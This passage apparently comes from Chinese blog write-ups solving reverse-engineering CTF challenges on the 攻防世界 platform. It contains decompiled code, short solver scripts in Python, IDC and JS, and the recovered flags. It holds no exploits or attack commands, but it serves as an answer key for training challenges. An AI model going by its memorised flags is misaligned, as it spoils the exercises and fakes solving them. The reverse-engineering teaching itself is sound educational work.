std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v18); return 0;} 乍一看很复杂，慢慢分析，发现了一个输入，被赋值给了v18，然后发现一个类的构造函数调用了我们输入的字符串，可以理解为，用我们的字符串初始化了类中的数据成员，进去仔细看看 12345678910111213141516171819nsigned __int64 __fastcall HighTemplar::HighTemplar(DarkTemplar *a1, __int64 a2){ char v3; // [rsp+17h] [rbp-19h] unsigned __int64 v4; // [rsp+18h] [rbp-18h] v4 = __readfsqword(0x28u); DarkTemplar::DarkTemplar(a1); *(_QWORD *)a1 = &amp;off_401EA0; *((_DWORD *)a1 + 3) = 0; std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string((char *)a1 + 16, a2); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string((char *)a1 + 48, a2); std::allocator&lt;char&gt;::allocator(&amp;v3, a2); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string( (char *)a1 + 80, \"327a6c4304ad5938eaf0efb6cc3e53dc\", &amp;v3); std::allocator&lt;char&gt;::~allocator(&amp;v3); return __readfsqword(0x28u) ^ v4;} 从这里看，类里面至少应该有一个getSerial()函数在off_401EA0处，三个字符串，偏移量分别为16，48，80，长度都是32位，还有一个布尔型变量，偏移量位3，并且我们还知道，我们的数据被传入了一个变量v23里，然后返回去，跟踪v23，找到剩下的关键函数 123456789101112131415161718192021222324252627282930313233343536373839404142bool __fastcall HighTemplar::calculate(HighTemplar *this){ __int64 v1; // rax _BYTE *v2; // rbx bool result; // al _BYTE *v4; // rbx int i; // [rsp+18h] [rbp-18h] int j; // [rsp+1Ch] [rbp-14h] if ( std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length((char *)this + 16) != 32 ) { v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Too short or too long\"); std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); exit(-1); } for ( i = 0; i &lt;= (unsigned __int64)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length((char *)this + 16); ++i ) { v2 = (_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[]( (char *)this + 16, i); *v2 = (*(_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[]( (char *)this + 16, i) ^ 0x50) + 23; } for ( j = 0; ; ++j ) { result = j &lt;= (unsigned __int64)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length((char *)this + 16); if ( !result ) break; v4 = (_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[]( (char *)this + 16, j); *v4 = (*(_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[]( (char *)this + 16, j) ^ 0x13) + 11; } return result;} 这一看就是个加密函数，并且只对偏移量位16处的字符串进行了操作，这里正好是我们输入的字符串，虽然有两个for循环，但是都是对同一个字符串的同一个位置进行操作，很好逆向，加密完之后应该还会有一个验证，找到下面的验证函数 1234567891011121314151617181920212223242526272829303132__int64 __fastcall HighTemplar::getSerial(HighTemplar *this){ __int64 v1; // rbx __int64 v2; // rax __int64 v3; // rax __int64 v4; // rax __int64 v5; // rax unsigned int i; // [rsp+1Ch] [rbp-14h] for ( i = 0; (signed int)i &lt; (unsigned __int64)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length((char *)this + 16); ++i ) { v1 = *(unsigned __int8 *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[]( (char *)this + 80, (signed int)i); if ( (_BYTE)v1 != *(_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[]( (char *)this + 16, (signed int)i) ) { v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"You did not pass \"); v5 = std::ostream::operator&lt;&lt;(v4, i); std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); *((_DWORD *)this + 3) = 1; return *((unsigned int *)this + 3); } v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Pass \"); v3 = std::ostream::operator&lt;&lt;(v2, i); std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); } return *((unsigned int *)this + 3);} 这个函数不长，很简单的验证了加密过后的字符串和偏移量位80的字符串是不是一样，用偏移量位3处的布尔值作为返回值，如果相同返回0，回到主函数，接下来就成功了，没有其他的变换和判断，所以这个程序实际上非常简单 12345target = \"327a6c4304ad5938eaf0efb6cc3e53dc\"flag = ''for i in target: flag += chr((((ord(i) - 11) ^ 0x13) - 23) ^ 0x50)print(flag) 很简单就可以逆向出，套上flag{}提交即可（这个flag长得实在不像是正确的） 1flag{tMx~qdstOs~crvtwb~aOba}qddtbrtcd} re4-unvm-mepyc格式，直接uncompyle6反编译，成功，没有对pyc文件动什么手脚，反编译后的源代码如下 123456789101112131415161718import md5md5s = [ 174282896860968005525213562254350376167, 137092044126081477479435678296496849608, 126300127609096051658061491018211963916, 314989972419727999226545215739316729360, 256525866025901597224592941642385934114, 115141138810151571209618282728408211053, 8705973470942652577929336993839061582, 256697681645515528548061291580728800189, 39818552652170274340851144295913091599, 65313561977812018046200997898904313350, 230909080238053318105407334248228870753, 196125799557195268866757688147870815374, 74874145132345503095307276614727915885]print 'Can you turn me back to python ? ...'flag = raw_input('well as you wish.. what is the flag: ')if len(flag) &gt; 69: print 'nice try' exit()if len(flag) % 5 != 0: print 'nice try' exit()for i in range(0, len(flag), 5): s = flag[i:i + 5] if int('0x' + md5.new(s).hexdigest(), 16) != md5s[(i / 5)]: print 'nice try' exit()print 'Congratz now you have the flag' 发现给出了很多md5，把flag每5个字符一组，算出md5要和给出的相同，所以用这些md5在线解密 组合起来就是flag 1ALEXCTF{dv5d4s2vj8nk43s8d8l6m1n5l67ds9v41n52nv37j481h3d28n4b6v3k} anser_to_everythingIDA打开 12345678910111213141516171819int __cdecl main(int argc, const char **argv, const char **envp){ int v4; // [rsp+Ch] [rbp-4h] printf(\"Gimme: \", argv, envp); __isoc99_scanf(\"%d\", &amp;v4); not_the_flag(v4); return 0;}//not_the_flag__int64 __fastcall not_the_flag(int a1){ if ( a1 == '*' ) puts(\"Cipher from Bill \\nSubmit without any tags\\n#kdudpeh\"); else puts(\"YOUSUCK\"); return 0LL;} 找到了一个字符串kdudpeh，根据题目提示，sha1加密得80ee2a3fe31da904c596d993f7f1de4827c1450a 套上flag得 1flag{80ee2a3fe31da904c596d993f7f1de4827c1450a} elrond32IDA打开，main函数如下 12345678910111213int __cdecl main(int a1, char **a2){ if ( a1 &gt; 1 &amp;&amp; sub_8048414(a2[1], 0) ) { puts(unk_80487E4); sub_8048538((int)a2[1]); } else { puts(\"Access denied\"); } return 0;} 我们得输入作为main函数得参数传入，在sub_8048414()函数中进行了一个判断，然后进入sub_8048538()函数处理后输出flag 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354signed int __cdecl sub_8048414(_BYTE *a1, int a2){ signed int result; // eax switch ( a2 ) { case 0: if ( *a1 == 'i' ) goto LABEL_19; result = 0; break; case 1: if ( *a1 == 'e' ) goto LABEL_19; result = 0; break; case 3: if ( *a1 == 'n' ) goto LABEL_19; result = 0; break; case 4: if ( *a1 == 'd' ) goto LABEL_19; result = 0; break; case 5: if ( *a1 == 'a' ) goto LABEL_19; result = 0; break; case 6: if ( *a1 == 'g' ) goto LABEL_19; result = 0; break; case 7: if ( *a1 == 's' ) goto LABEL_19; result = 0; break; case 9: if ( *a1 == 'r' )LABEL_19: result = sub_8048414(a1 + 1, 7 * (a2 + 1) % 11); else result = 0; break; default: result = 1; break; } return result;} 判断得过程是一个递归，因为返回值要为1，所以递归过程中得每一个if都需要满足，所以很好得到输入的字符串是什么 12345678910int __cdecl sub_8048538(int a1){ int v2[33]; // [esp+18h] [ebp-A0h] int i; // [esp+9Ch] [ebp-1Ch] qmemcpy(v2, &amp;unk_8048760, sizeof(v2)); for ( i = 0; i &lt;= 32; ++i ) putchar(v2[i] ^ *(char *)(a1 + i % 8)); return putchar(10);} 输出部分只进行了一个很简单的处理，而且不需要逆向，直接用同样的方式处理即可 123456789101112131415targrt = 'ie_ndags_r'f = ''j = 0for i in range(8): f += targrt[j] j = 7 * (j + 1) % 11# print(f)flag = ''a2 = [0x0F, 0x1F, 0x04, 0x09, 0x1C, 0x12, 0x42, 0x09, 0x0C, 0x44, 0x0D, 0x07, 0x09, 0x06, 0x2D, 0x37, 0x59, 0x1E, 0x00, 0x59, 0x0F, 0x08, 0x1C, 0x23, 0x36, 0x07, 0x55, 0x02, 0x0C, 0x08, 0x41, 0x0A, 0x14]for i in range(33): flag += chr(a2[i] ^ ord(f[i % 8]))print(flag) 输出flag 1flag{s0me7hing_S0me7hinG_t0lki3n}","link":"/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/"},{"title":"攻防世界-re部分题解（五）","text":"后面的题目也越来越难了，比较难比较复杂的题目会单拉出来写，这里就记录一些比较简单的题目。 easy_Maze看名字就知道是个迷宫题，IDA打开看看 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112int __cdecl main(int argc, const char **argv, const char **envp){ __int64 v3; // rax int v5[7]; // [rsp+0h] [rbp-270h] int v6; // [rsp+C0h] [rbp-1B0h] int v7[7]; // [rsp+D0h] [rbp-1A0h] int v8; // [rsp+190h] [rbp-E0h] int v9[7]; // [rsp+1A0h] [rbp-D0h] int v10; // [rsp+1BCh] [rbp-B4h] int v11; // [rsp+1C0h] [rbp-B0h] int v12; // [rsp+1C4h] [rbp-ACh] int v13; // [rsp+1C8h] [rbp-A8h] int v14; // [rsp+1CCh] [rbp-A4h] int v15; // [rsp+1D0h] [rbp-A0h] int v16; // [rsp+1D4h] [rbp-9Ch] int v17; // [rsp+1D8h] [rbp-98h] int v18; // [rsp+1DCh] [rbp-94h] int v19; // [rsp+1E0h] [rbp-90h] int v20; // [rsp+1E4h] [rbp-8Ch] int v21; // [rsp+1E8h] [rbp-88h] int v22; // [rsp+1ECh] [rbp-84h] int v23; // [rsp+1F0h] [rbp-80h] int v24; // [rsp+1F4h] [rbp-7Ch] int v25; // [rsp+1F8h] [rbp-78h] int v26; // [rsp+1FCh] [rbp-74h] int v27; // [rsp+200h] [rbp-70h] int v28; // [rsp+204h] [rbp-6Ch] int v29; // [rsp+208h] [rbp-68h] int v30; // [rsp+20Ch] [rbp-64h] int v31; // [rsp+210h] [rbp-60h] int v32; // [rsp+214h] [rbp-5Ch] int v33; // [rsp+218h] [rbp-58h] int v34; // [rsp+21Ch] [rbp-54h] int v35; // [rsp+220h] [rbp-50h] int v36; // [rsp+224h] [rbp-4Ch] int v37; // [rsp+228h] [rbp-48h] int v38; // [rsp+22Ch] [rbp-44h] int v39; // [rsp+230h] [rbp-40h] int v40; // [rsp+234h] [rbp-3Ch] int v41; // [rsp+238h] [rbp-38h] int v42; // [rsp+23Ch] [rbp-34h] int v43; // [rsp+240h] [rbp-30h] int v44; // [rsp+244h] [rbp-2Ch] int v45; // [rsp+248h] [rbp-28h] int v46; // [rsp+24Ch] [rbp-24h] int v47; // [rsp+250h] [rbp-20h] int v48; // [rsp+254h] [rbp-1Ch] int v49; // [rsp+258h] [rbp-18h] int v50; // [rsp+25Ch] [rbp-14h] int v51; // [rsp+260h] [rbp-10h] v9[0] = 1; v9[1] = 1; v9[2] = -1; v9[3] = 1; v9[4] = -1; v9[5] = 1; v9[6] = -1; v10 = 0; v11 = 0; v12 = 0; v13 = 0; v14 = 1; v15 = -1; v16 = 0; v17 = 0; v18 = 1; v19 = 0; v20 = 0; v21 = 1; v22 = 0; v23 = -1; v24 = -1; v25 = 0; v26 = 1; v27 = 0; v28 = 1; v29 = -1; v30 = 0; v31 = -1; v32 = 0; v33 = 0; v34 = 0; v35 = 0; v36 = 0; v37 = 1; v38 = -1; v39 = -1; v40 = 1; v41 = -1; v42 = 0; v43 = -1; v44 = 2; v45 = 1; v46 = -1; v47 = 0; v48 = 0; v49 = -1; v50 = 1; v51 = 0; memset(v7, 0, 0xC0uLL); v8 = 0; memset(v5, 0, 0xC0uLL); v6 = 0; Step_0((int (*)[7])v9, 7, (int (*)[7])v7); Step_1((int (*)[7])v7, 7, (int (*)[7])v5); v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;_bss_start, \"Please help me out!\"); std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); Step_2((int (*)[7])v5, 7); system(\"pause\"); return 0;} 首先新建了三个地图，初始化了其中一个，然后利用下面两步分别初始化另外两个图 12Step_0((int (*)[7])v9, 7, (int (*)[7])v7);Step_1((int (*)[7])v7, 7, (int (*)[7])v5); 具体的操作在Step_2((int (*)[7])v5, 7)里，可以看到只用了最后的一个图，可以直接动态调试dump出地图来，然后看一下具体操作 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364__int64 __fastcall Step_2(int (*a1)[7]){ int v1; // eax __int64 v2; // rax __int64 v3; // rax __int64 result; // rax __int64 v5; // rax char v6[35]; // [rsp+10h] [rbp-30h] char v7; // [rsp+33h] [rbp-Dh] int v8; // [rsp+34h] [rbp-Ch] int v9; // [rsp+38h] [rbp-8h] int v10; // [rsp+3Ch] [rbp-4h] v10 = 0; v9 = 0; v8 = 0; while ( v8 &lt;= 29 &amp;&amp; (*a1)[7 * v10 + v9] == 1 ) { std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cin, &amp;v7); v1 = v8++; v6[v1] = v7; if ( v7 == 100 ) { ++v9; } else if ( v7 &gt; 100 ) { if ( v7 == 115 ) { ++v10; } else { if ( v7 != 119 ) goto LABEL_14; --v10; } } else if ( v7 == 97 ) { --v9; } else {LABEL_14: v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;_bss_start, \"include illegal words.\"); std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); } } if ( v10 != 6 || v9 != 6 ) { v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;_bss_start, \"Oh no!,Please try again~~\"); std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); result = 0LL; } else { v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;_bss_start, \"Congratulations!\"); std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); output(v6, v8); result = 1LL; } return result;} 难度不是很大，经典的wasd，只能经过1的位置，走到最后就可以了，整个路径的操作就是flag，格式为UNCTF{} dump出的地图为 12345671 0 0 1 1 1 11 0 1 1 0 0 11 1 1 0 1 1 10 0 0 1 1 0 01 1 1 1 0 0 01 0 0 0 1 1 11 1 1 1 1 0 1 走出来就可以了 1ssddwdwdddssaasasaaassddddwdds 验证一下 123456root@rycbar17th:~# ./easy_Maze Please help me out!ssddwdwdddssaasasaaassddddwddsCongratulations!Thanks! Give you a flag: UNCTF{ssddwdwdddssaasasaaassddddwdds}sh: 1: pause: not found 得到flag 1UNCTF{ssddwdwdddssaasasaaassddddwdds} ReverseMe-120将输入的字符串进行base64加密然后异或，和明文字符串进行对比 12345678910111213141516171819202122232425if ( v18 &amp;&amp; *v19 &gt;= v13 ) { v21 = 3; v14 = 0; for ( lengtha = 0; v5; --v5 ) { v15 = *v7; if ( *v7 != 13 &amp;&amp; v15 != 10 &amp;&amp; v15 != 32 ) { v16 = byte_414E40[v15]; v21 -= v16 == 64; v14 = v16 &amp; 0x3F | (v14 &lt;&lt; 6); if ( ++lengtha == 4 ) { lengtha = 0; if ( v21 ) *v12++ = BYTE2(v14); if ( v21 &gt; 1 ) *v12++ = BYTE1(v14); if ( v21 &gt; 2 ) *v12++ = v14; } } ++v7; } 有很多的无用代码，这里是关键代码，可以看到每四个字节进行了拼接，输出为三个字节，很显然是base64。 Replace湖湘杯2018的题目，当时还参加过，那时候连这道题都毫无头绪(真的菜 这就是个简单的换表题，先upx脱个壳 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061int __cdecl main(int argc, const char **argv, const char **envp){ int v3; // kr00_4 char Buf; // [esp+4h] [ebp-2Ch] char Dst; // [esp+5h] [ebp-2Bh] Buf = 0; memset(&amp;Dst, 0, 0x27u); printf(\"Welcome The System\\nPlease Input Key:\"); gets_s(&amp;Buf, 0x28u); v3 = strlen(&amp;Buf); if ( (unsigned int)(v3 - 35) &lt;= 2 ) { if ( sub_401090((int)&amp;Buf, v3) == 1 ) printf(\"Well Done!\\n\"); else printf(\"Your Wrong!\\n\"); } return 0;}signed int __fastcall sub_401090(int input, int length){ int _input; // ebx int index; // edx char tmp_char; // al int v6; // esi int v7; // edi char v8; // al int v9; // eax char v10; // cl int v11; // eax int v12; // ecx _input = input; if ( length != 35 ) return -1; index = 0; while ( 1 ) { tmp_char = *(_BYTE *)(index + _input); v6 = (tmp_char &gt;&gt; 4) % 16; v7 = (16 * tmp_char &gt;&gt; 4) % 16; v8 = byte_402150[2 * index]; if ( v8 &lt; '0' || v8 &gt; '9' ) v9 = v8 - 'W'; else v9 = v8 - '0'; v10 = byte_402151[2 * index]; v11 = 16 * v9; if ( v10 &lt; '0' || v10 &gt; '9' ) v12 = v10 - 'W'; else v12 = v10 - '0'; if ( (unsigned __int8)byte_4021A0[16 * v6 + v7] != ((v11 + v12) ^ 0x19) ) break; if ( ++index &gt;= 35 ) return 1; } return -1;} 处理了半天，高四位低四位的处理来处理去，最后还要合在一起…… 1234567891011121314151617181920212223242526272829303132333435target = [ 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]var = [0x2a, 0x49, 0xf6, 0x9c, 0x38, 0x39, 0x5c, 0xde, 0x96, 0xd6, 0xde, 0x96, 0xd6, 0xf4, 0xe0, 0x25, 0x48, 0x49, 0x54, 0xd6, 0x19, 0x54, 0x48, 0xde, 0xf6, 0xe2, 0xda, 0xd6, 0x77, 0x86, 0xe2, 0x1d, 0x5a, 0xda, 0xe6]flag = ''for i in var: tmp = target.index(i^0x19) flag += chr(tmp)print(flag) 输出flag 1flag{Th1s_1s_Simple_Rep1ac3_Enc0d3} babyRE又是一道SMC，不知道为什么最近遇到的还是挺多的 没有任何加密，IDA打开 1234567891011121314151617181920int __cdecl main(int argc, const char **argv, const char **envp){ char s; // [rsp+0h] [rbp-20h] int v5; // [rsp+18h] [rbp-8h] int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; i &lt;= 181; ++i ) { envp = (const char **)(*((unsigned __int8 *)judge + i) ^ 0xCu); *((_BYTE *)judge + i) ^= 0xCu; } printf(\"Please input flag:\", argv, envp); __isoc99_scanf(\"%20s\", &amp;s); v5 = strlen(&amp;s); if ( v5 == 14 &amp;&amp; (unsigned int)judge((__int64)&amp;s) ) puts(\"Right!\"); else puts(\"Wrong!\"); return 0;} 经典的输入然后验证，不过judge函数是打不开的，看前面的操作，典型的SMC，写个IDC脚本跑一下 12345678910111213141516#include &lt;idc.idc&gt;static main() { auto judge, addr,tmp; judge = 0x600B00; auto i; for ( i = 0; i &lt;= 181; ++i ) { addr=judge+i; tmp=Byte(addr); tmp=tmp^ 0xC; PatchByte(addr,tmp); } Message(\"Down!\");} 然后改一下judge函数的结束位置，F5分析，逻辑很好懂 12345678910111213141516171819202122232425262728signed __int64 __fastcall judge(__int64 a1){ __int64 v2; // [rsp-8h] [rbp-8h] *(&amp;v2 - 5) = a1; *((_BYTE *)&amp;v2 - 32) = 0x66; *((_BYTE *)&amp;v2 - 31) = 0x6D; *((_BYTE *)&amp;v2 - 30) = 0x63; *((_BYTE *)&amp;v2 - 29) = 0x64; *((_BYTE *)&amp;v2 - 28) = 0x7F; *((_BYTE *)&amp;v2 - 27) = 0x6B; *((_BYTE *)&amp;v2 - 26) = 0x37; *((_BYTE *)&amp;v2 - 25) = 0x64; *((_BYTE *)&amp;v2 - 24) = 0x3B; *((_BYTE *)&amp;v2 - 23) = 0x56; *((_BYTE *)&amp;v2 - 22) = 0x60; *((_BYTE *)&amp;v2 - 21) = 0x3B; *((_BYTE *)&amp;v2 - 20) = 0x6E; *((_BYTE *)&amp;v2 - 19) = 0x70; for ( *((_DWORD *)&amp;v2 - 1) = 0; *((_DWORD *)&amp;v2 - 1) &lt;= 13; ++*((_DWORD *)&amp;v2 - 1) ) *(_BYTE *)(*((signed int *)&amp;v2 - 1) + *(&amp;v2 - 5)) ^= *((_DWORD *)&amp;v2 - 1); for ( *((_DWORD *)&amp;v2 - 1) = 0; *((_DWORD *)&amp;v2 - 1) &lt;= 13; ++*((_DWORD *)&amp;v2 - 1) ) { if ( *(_BYTE *)(*((signed int *)&amp;v2 - 1) + *(&amp;v2 - 5)) != *((_BYTE *)&amp;v2 + *((signed int *)&amp;v2 - 1) - 32) ) return 0LL; } return 1LL;} 这里其实有三个变量，&amp;v2-1的位置是一个整型，实际上是索引值，&amp;v2-5是我们输入的字符串，&amp;v2-19是最终的目标，只有一个异或操作，很简单就可以跑出来结果 12345target = [0x66, 0x6D, 0x63, 0x64, 0x7F, 0x6B, 0x37, 0x64, 0x3B, 0x56, 0x60, 0x3B, 0x6E, 0x70]flag = ''for i in range(14): flag += chr(target[i] ^ i)print(flag) 输出flag 1flag{n1c3_j0b} What-does-this-button-do不知道为什么这题放在了这个位置，简单得不能再简单的一个mobile jadx打开，很快就可以找到关键代码 12345678910public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_flag); String flag = \"\"; int[] d = {102, 108, 97, 103, 123, 119, 52, 110, 110, 52, 95, 106, 52, 114, 95, 109, 121, 95, 100, 51, 120, 125}; for (int i = 0; i &lt; 22; i++) { flag = flag.concat(String.valueOf((char) d[i])); } ((TextView) findViewById(R.id.flagText)).setText(flag); } 然后直接输出把flag输出就可以了 不过这题要去掉外面的flag{}提交 1w4nn4_j4r_my_d3x 76号单字检测，pintools爆破，得到flag 直接滚轮子 1flag{09vdf7wefijbk} easy_go这题根据名字也知道是go逆向，IDA打开是乱七八糟的函数，也没有任何的symbol，用go重命名的插件给函数重命名，发现一个base64的解码函数和奇怪的字符串，字母表不是很清楚，动态调试一下 123456789101112131415161718192021222324[-------------------------------------code-------------------------------------] 0x4952dd: mov QWORD PTR [rsp],rax 0x4952e1: mov QWORD PTR [rsp+0x8],rcx 0x4952e6: mov QWORD PTR [rsp+0x10],rdx=&gt; 0x4952eb: call 0x47e620 0x4952f0: mov rax,QWORD PTR [rsp+0x38] 0x4952f5: mov rcx,QWORD PTR [rsp+0x30] 0x4952fa: mov rdx,QWORD PTR [rsp+0x18] 0x4952ff: mov rbx,QWORD PTR [rsp+0x20]No argument[------------------------------------stack-------------------------------------]0000| 0xc000070e90 --&gt; 0xc000074580 (\"6789_-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345\", '\\377' &lt;repeats 45 times&gt;, \"\\005\\377\\377:;&lt;=&gt;?\")0008| 0xc000070e98 --&gt; 0xc000088040 (\"tGRBtXMZgD6ZhalBtCUTgWgZfnkTgqoNsnAVsmUYsGtCt9pEtDEYsql3\")0016| 0xc000070ea0 --&gt; 0x38 ('8')0024| 0xc000070ea8 --&gt; 0x40 ('@')0032| 0xc000070eb0 --&gt; 0xc000088040 (\"tGRBtXMZgD6ZhalBtCUTgWgZfnkTgqoNsnAVsmUYsGtCt9pEtDEYsql3\")0040| 0xc000070eb8 --&gt; 0x38 ('8')0048| 0xc000070ec0 --&gt; 0x1 0056| 0xc000070ec8 --&gt; 0x1 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueThread 1 \"easyGo\" hit Breakpoint 3, 0x00000000004952eb in ?? () 找到字母表和密文，解密得到flag 1flag{92094daf-33c9-431e-a85a-8bfbd5df98ad} easyCpp这题有很多c++标准库的调用，整体来说不是很难，可以通过调试发现每一部分的作用，也不是很难 re5-packed-movement极其无聊的一道题，硬生生用mov实现了所有操作，要求输入flag对比一下，直接objdump就能再汇编代码里找到逐字符将flag移入到某个地址，或者因为是逐字符验证，直接pintools爆破也可以 the_maya_society大致意思就是对当前时间进行一个md5加密，然后和一个字符串连接成目标网址，如果这个目标是对的后面的通信就会得到正确的flag…… 时间应该是2012-12-21 2ex1mips，并且strip过，什么信息都没有，打开输出发现很像base64，但应该换过表，ghidra打开找找可疑字符串，发现奇怪的字符串 1@,.1fgvw#`/2ehux$~\"3dity%_;4cjsz^+{5bkrA&amp;=}6alqB*-[70mpC()]89noD 试一试就得到了flag 1flag{change53233} 对这个字符串表进行交叉引用查询到话也可以找到进行base64编码的函数","link":"/2020/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%BA%94%EF%BC%89/"},{"title":"攻防世界-re部分题解（四）","text":"最近比较忙，而且题目越做越快，平时的练习除非特别值得注意的，都不会写的太详细了 serial-150这题本身的算法没什么难度，主要就是花指令的去除，去除之后就只是简单的字符串比较了，很容易。 1EZ9dmq4c8g9G7bAV testre主要就是一个base58，很好做，尝试了一下ghidra的效果发现不尽如人意，所以主要还是采用IDA做题。 1flag{base58_is_boring} simple-check-100这题没什么好写的，虽然前面的check函数进行了检测，但是后面的计算和前面的输入没什么关系，并且直接把flag给输出了，所以直接gdb调试改了eax的值直接输出flag就好了 1flag_is_you_know_cracking!!! secret-string-400一直不知道这是什么，后来发现这竟然是个压缩包，里面有个网页和调用的js，js里面可以看到把机器码转成了命令然后执行，所以在执行之前输出一下 1console.log(command); 在console里找到了关键判断 1234567891011121314151617181920212223var f=window.machine.registers[1].userinputvar i = f.lengthvar nonce = 'groke';var j = 0;var out = [];var eq = true;while(j &lt; i){ out.push(f.charCodeAt(j) ^ nonce.charCodeAt(j%5)) j++;}var ex = [1, 30, 14, 12, 69, 14, 1, 